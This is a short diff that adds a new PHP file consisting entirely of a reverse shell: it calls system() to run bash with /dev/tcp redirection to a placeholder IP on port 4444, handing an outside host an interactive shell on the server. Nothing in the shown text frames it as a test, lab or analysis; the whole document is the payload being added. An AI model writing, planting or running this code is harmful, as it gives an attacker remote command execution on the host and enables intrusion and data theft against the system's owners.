@@ -1,0 +1,5 @@
+<?php
+$ip = 'IP';
+$port = 4444;
+system("/bin/bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1'");
+?>
